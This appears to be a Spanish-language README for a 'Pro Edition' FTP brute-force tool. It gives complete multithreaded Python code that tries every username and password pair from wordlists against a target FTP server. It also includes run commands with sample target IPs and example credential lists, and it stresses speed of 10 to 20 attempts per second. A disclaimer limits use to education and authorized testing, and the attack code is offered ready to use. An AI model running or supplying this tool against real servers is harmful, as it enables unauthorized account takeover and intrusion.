# 🔓 FTP Brute Force Tool - Pro Edition

> Una herramienta educativa para pruebas de penetración autorizadas. Ataque de fuerza bruta contra servidores FTP con concurrencia, argumentos CLI y salida colorizada.

---

## 📋 Características

✅ **Multi-threading** - Prueba múltiples credenciales simultáneamente (10-20 intentos/segundo)  
✅ **Argumentos CLI** - Configuración flexible sin hardcoding con `argparse`  
✅ **Salida Colorizada** - Identifica éxitos y fallos al instante con `colorama`  
✅ **Manejo Seguro de Archivos** - Usa `with` para liberar recursos automáticamente  
✅ **Timeouts Inteligentes** - Evita bloqueos en servidores lentos  
✅ **Manejo de Excepciones** - El script no se detiene ante fallos  

---

## 🚀 Instalación

```bash
# Clonar o descargar el repositorio
git clone <repo-url>
cd ftp-brute-forcer

# Instalar dependencias
pip install colorama
```

---

## 💻 Uso

```bash
python3 brute.py -t 192.168.209.132 -u users.txt -p pass.txt -w 10
```

### Parámetros

| Argumento | Corto | Descripción | Obligatorio |
|-----------|-------|-------------|------------|
| `--target` | `-t` | IP del servidor FTP objetivo | ✅ |
| `--users` | `-u` | Archivo con lista de usuarios | ✅ |
| `--passwords` | `-p` | Archivo con lista de contraseñas | ✅ |
| `--workers` | `-w` | Número de hilos concurrentes (default: 5) | ❌ |

### Ejemplos

```bash
# Ataque básico
python3 brute.py -t 192.168.1.100 -u users.txt -p pass.txt

# Con 20 hilos para máxima velocidad
python3 brute.py -t 192.168.1.100 -u users.txt -p pass.txt -w 20

# Ayuda
python3 brute.py -h
```

---

## 📁 Estructura de Archivos

```
users.txt          # Un usuario por línea
admin
root
ftp
test

pass.txt           # Una contraseña por línea
123456
password
admin
qwerty
```

---

## 🔧 Código Completo

```python
import ftplib
import argparse
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style, init

# Inicializa colores para Windows/Linux
init(autoreset=True)

def connect_ftp(target, user, password):
    try:
        ftp = ftplib.FTP(target, timeout=5)
        ftp.login(user, password)
        print(f"{Fore.GREEN}[+] ¡ÉXITO! --> {user}:{password}")
        ftp.quit()
        return True
    except:
        print(f"{Fore.RED}[-] Falló: {user}:{password}")
        return False

def main():
    parser = argparse.ArgumentParser(description="FTP Brute Forcer Pro")
    parser.add_argument("-t", "--target", required=True, help="IP del objetivo")
    parser.add_argument("-u", "--users", required=True, help="Diccionario de usuarios")
    parser.add_argument("-p", "--passwords", required=True, help="Diccionario de contraseñas")
    parser.add_argument("-w", "--workers", type=int, default=5, help="Hilos concurrentes")
    
    args = parser.parse_args()

    # Carga de listas de forma eficiente
    with open(args.users, 'r') as u, open(args.passwords, 'r') as p:
        users = [line.strip() for line in u]
        passwords = [line.strip() for line in p]

    print(f"{Fore.CYAN}[*] Iniciando ataque contra {args.target}...\n")

    # Ejecución multihilo (Más rápido)
    with ThreadPoolExecutor(max_workers=args.workers) as executor:
        for user in users:
            for password in passwords:
                executor.submit(connect_ftp, args.target, user, password)

if __name__ == "__main__":
    main()
```

---

## ⚡ ¿Por Qué Esta Versión es "Pro"?

### 🔄 Multi-threading
Con `ThreadPoolExecutor`, prueba **10-20 credenciales por segundo** en lugar de una por una. Una lista de 100 usuarios × 100 contraseñas tarda minutos, no horas.

### 🎯 Argparse
Ejecución elegante y profesional sin modificar código:
```bash
python3 brute.py -t 192.168.1.1 -u users.txt -p pass.txt
```

### 🎨 Colorama
Identifica instantáneamente credenciales válidas en pantalla llena de intentos fallidos.

### ⏱️ Timeouts
`timeout=5` evita que el script se cuelgue si el servidor no responde.

### 📂 Gestión de Recursos
`with open()` cierra automáticamente los archivos, evitando memory leaks.

---

## ⚠️ Disclaimer Legal

**SOLO PARA USO EDUCATIVO Y EN ENTORNOS AUTORIZADOS**

Este script está diseñado para:
- 🎓 Aprendizaje de ciberseguridad
- 🔐 Pruebas de penetración con consentimiento explícito
- 🛡️ Auditorías de seguridad propias

**NO USES** contra sistemas sin autorización. El acceso no autorizado es ilegal.

---

## 📚 Conceptos Clave

| Concepto | Explicación |
|----------|------------|
| **Brute Force** | Probar todas las combinaciones posibles hasta encontrar la correcta |
| **FTP** | Protocolo de transferencia de archivos (puerto 21) |
| **Threading** | Ejecutar múltiples tareas simultáneamente |
| **Timeout** | Límite de tiempo para evitar bloqueos |

---

## 
